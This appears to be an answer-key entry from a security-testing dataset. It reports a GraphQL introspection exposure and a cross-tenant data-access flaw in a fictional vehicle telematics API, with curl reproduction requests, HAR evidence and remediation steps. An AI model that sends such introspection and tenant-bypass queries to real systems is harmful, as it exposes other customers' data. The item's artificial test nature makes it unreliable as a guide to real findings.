# Expected Response

## System
- Domain: Automotive / V2X Telematics
- System: AetherDrive V2X Telematics
- Example ID: GQL-0105

## Priority Findings

### Finding 1: V2X Telematics Schema Over-Exposure — Introspection Enabled + Cross-Tenant Telematics Access (Pattern 6.1)
**Severity:** High
**Category:** Misconfiguration / Schema Over-Exposure

**Summary:**
Per §5.0 (Pattern 6.1 — schema/relationship over-exposure): GraphQL introspection is enabled in production on an automotive V2X telematics platform. An attacker can query `__schema` to discover all resolver names and field paths — including vehicle-specific telemetry fields, location data, and safety-critical system states. Additionally, `listResources(tenantId:)` (RISK-GQL-105) trusts client-supplied tenantId, enabling cross-tenant telematics data access from `tenant-73f8` to `tenant-48cf`.

**Evidence from HAR:**
- Request: `POST https://api.aetherdrive-v2x-t.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-73f8`
- Query: `listResources(tenantId: "tenant-48cf") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-48cf"`, `ownerId: "other-user-73f848cf"`, `sensitiveField: "CONFIDENTIAL-73f848cf"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-73f848cf`

## Steps to Reproduce

### Step 1 — Schema introspection (Pattern 6.1)
```bash
curl -s -X POST https://api.aetherdrive-v2x-t.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-73f8" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```
**Vulnerable:** Full V2X schema exposed including vehicle telemetry field names.

### Step 2 — Cross-tenant telematics data access (HAR)
```bash
curl -s -X POST https://api.aetherdrive-v2x-t.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-73f8" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-48cf\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-73f848cf` V2X telematics data from `tenant-48cf`. **Secure:** FORBIDDEN.

## Remediation
1. Disable introspection in production: `introspection: false` in Apollo Server config.
2. `listResources` must use JWT `tenantId` — discard client argument.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
